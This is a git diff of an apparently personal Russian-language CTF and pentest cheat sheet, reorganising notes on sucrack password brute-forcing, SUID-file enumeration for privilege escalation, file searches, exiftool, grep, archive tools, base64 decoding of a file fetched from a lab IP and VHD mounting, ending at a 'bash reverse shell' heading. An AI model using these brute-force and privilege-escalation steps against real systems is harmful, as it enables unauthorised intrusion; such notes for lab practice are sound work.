@@ -3,8 +3,17 @@
 ./sucrack -a -w 20 -s 10 -u max -r file
 
 # PERM SUID
+Поиск файлов со Suid
+	find / -perm -4000 2>/dev/null | xargs ls -la
 
-find / -perm -4000 2>/dev/null | xargs ls -la
+Поиск файлов входящих в группу
+	find / -type f -group developers 2>/dev/null -ls
+
+Поиск и передача в другую команду
+ 	find . -type f -ls
+
+Поиск и передать на вход exiftool
+	find . -type f -exec exiftool {} \\;
 
 # NMAP
 	
@@ -29,20 +38,11 @@ class Program
     }
 }
 
-# Поиск файлов в текущей директории
-
-find . -type f -ls
-
----- найти и передать на вход exiftool
-
-find . -type f -exec exiftool {} \\;
-
-
 # GREP
 
 Поиск и вырезание слов из файла
 
- 	grep "Up" file.txt | cur -d " " -f2
+ 	grep "Up" file.txt | cut -d " " -f2
 
  (разделитель - пробел 2-й абзац)
 
@@ -78,17 +78,9 @@ binwalk --dd='.*' music.mp3
 
 grep qwerty | wc -c ---> 6
 
-# метаданные
-
-exiftool file
-
 # Строки ASCII из файла
 
 strings file
-
-# Разархивировать 
-
- 7z x application.zip  
 
 # кодировка base64
 
@@ -117,7 +109,10 @@ cat password_backup | xxd -r > bak
 
 curl -s http://10.10.10.150/secret.txt | base64 -d
 
+
 # Архиваторы
+
+7z x application.zip  
 
 bzip2 -d bak
 
@@ -163,10 +158,6 @@ cifs - Common Internet File System
 # Монтирование гостевой операционки с дика VHD
 
 guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/vhd
-
-# FIND
-
-    find . -type f
 
 # Обратная оболочка bash
 
